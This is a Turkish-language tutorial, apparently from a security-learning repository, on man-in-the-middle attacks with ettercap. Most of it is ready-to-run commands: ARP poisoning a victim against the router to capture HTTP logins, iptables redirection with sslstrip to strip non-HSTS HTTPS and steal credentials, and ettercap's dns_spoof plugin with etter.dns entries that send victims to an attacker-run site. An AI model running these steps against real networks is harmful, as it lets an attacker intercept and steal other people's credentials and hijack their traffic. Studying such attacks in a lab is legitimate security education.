# MITM Saldırısı
MITM (Man In The Middle) saldırısı yapmak için kullanılan bir sürü araç vardır. Benim tercihim ise ettercap. Sebebi ise kullanırken diğer araçlara nazaran (mitmproxy, bettercap gibi) daha az hata ile karşılaşmam. Bir diğer sebebi ise grafiksel arayüzünün de mevcut olması.<br/>
Ettercap ile nasıl saldırı yapacağımıza geçmeden önce yapmamız gereken bir düzenleme var. IP yönlendirmeyi etkin hale getirmeliyiz.Bunun için aşağıdaki komutu çalıştırmalıyız.<br/><br/>
`echo 1 > /proc/sys/net/ipv4/ip_forward`
### Ettercap ile HTTP siteler için saldırmak
Ettercap ile saldırı yapmadan önce /etc/ettercap/etter.conf dosyasında değişiklik yapmamız gerekiyor.<br/><br/>
`leafpad /etc/ettercap/etter.conf`<br/><br/>
komutu ile ilgili dosyayı açıyoruz.<br/><br/>
#####################################<br/>
\# redir_command_on/off<br/>
#####################################<br/><br/>
başlığı altında Linux bölmesinde redir_command_on ve redir_command_off satırlarının başında bulunan # karakterlerini siliyoruz. Sonrasında ettercap’i çalıştırabiliriz.<br/><br/>
`ettercap -Tq ///`<br/><br/>
bu komut ile ettercap’i sadece çalıştırdık, bir adres vs. girmediğimiz için herhangi bir saldırı başlatmadık. bu komutu çalıştırdıktan sonra l tuşuna basarsak aynı ağdaki cihazları bulacaktır. q ile de çıkış yapabiliyoruz.<br/>
Saldırı yapmak için aşağıdaki komutu çalıştırıyoruz.<br/><br/>
`ettercap -Tq -M arp:remote -i eth0 /192.168.10.1// /192.168.10.131//`<br/><br/>
Burada ///’ların bir anlamı var. mac_adress/ipv4/ipv6/port şeklinde girdi verebiliyoruz. Yukarıda ipv4 kullanarak bir saldırı yaptık. Önce modemin IP adresini, sonra kurbanın IP adresini yazdık. Bu komutu yazdıktan sonra kurban bir http sitesi üzerinden credentials girerse terminalimize düşecektir.
### Ettercap ile HTTPS siteler için saldırmak
HTTPS sitelerden gelen bilgileri okumak için ya ettercap içindeki bir plugin'i, ya da sslstrip kullanmalıyız. sslstrip halihazırda yoksa indirmeliyiz. Lakin kurulumu ve çalıştırmasında bazen sorun çıkabiliyor. Bunun için internetten araştırma yapmak gerekebilir. Benim karşılaştığım bir sorun vardı, çözümünü bulduğum video: [Sslstrip | requirement already satisfied: twisted in /usr/lib/python3/dist-packages (18.9.0)](https://www.youtube.com/watch?v=CCfJRYmJo2s&list=LL&index=1)<br/><br/>
İlk olarak yönlendirme yapmalıyız.<br/><br/>
`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000`<br/><br/>
Sonra `sslstrip` diyerek sslstrip'i çalıştırıyoruz. Bir başka terminale geçip aşağıdaki komutu çalıştırıyoruz.<br/><br/>
`ettercap -Tq -M arp:remote -S -i eth0 /192.168.10.1// /192.168.10.15//`<br/><br/>
HTTP siteler için yaptığımız saldırıdaki komuttan farklı olarak -S ekledik. Eğer kurban HSTS olmayan, ama HTTPS kullanan bir sitede credentials girerse elimize düşecektir. Evet, maalesef HSTS varsa saldırımız işe yaramıyor. HSTS'in ne olduğu ve buna karşılık nasıl bir saldırı yapılabileceğini konu alan bir makale buldum, bu repoda bu döküman ile aynı dizin içine koydum.<br/><br/>
İşimiz bittikten sonra aşağıdaki komut ile yaptığımız yönlendirmeleri kaldırabiliriz.<br/><br/>
`iptables -t nat --flush`
### Ettercap ile DNS Saldırısı
DNS saldırısını şu şekilde özetleyebiliriz: Biz ortadaki adam olduğumuza göre bir kullanıcı bir siteye girmek istediğinde o kullanıcıya DNS sunucusunun o site için döndüğü IP adresi yerine başka bir IP adresi verebiliriz. Bunun adı DNS saldırısıdır. Göreceğimiz örnekte bir web sunucusu kurup ağ içindeki diğer kullanıcıları yerel ağda bulunan sitemize yönlendireceğiz. Kali Linux üzerinde web sunucusu kurmak için:<br/><br/>
`service apache2 start`<br/><br/>
Sonrasında /etc/ettercap/etter.dns dosyasında değişiklik yapmalıyız.<br/><br/>
`leafpad /etc/ettercap/etter.dns`<br/><br/>
Aşağıdaki eklemeleri yapıyoruz.<br/><br/>
```
domain.com A 10.0.2.10
*.domain.com A 10.0.2.10
www.domain.com A 10.0.2.10
```
<br/>Bunlardan biri de yapacağımız saldırıya göre yeterli olabilir. Sonrasında aşağıdaki komut ile saldırımızı başlatıyoruz.<br/><br/>
`ettercap -Tq -M arp:remote -P dns_spoof -i eth0 /192.168.10.1// /192.168.10.15//`
### Sonuç
Ettercap ile MITM saldırısının nasıl yapılacağını görmüş olduk. Tabii ki ettercap tek araç değil, birçok farklı araç kullanılarak da MITM saldırısı yapılabilir. Hatta bu repo içinde bulunan scriptler ile de MITM saldırısı yapılabilir. Hatta ve hatta bu scriptler başka araçlarla birlikte kullanılıp HTTPS siteler için MITM saldırısı yapılabilir. Örnek verecek olursak arp_poisoner ve packet_listener scriptlerimizi sslstrip ve dns2proxy ile birlikte kullanarak HTTPS siteler için MITM saldırısı yapabiliriz.
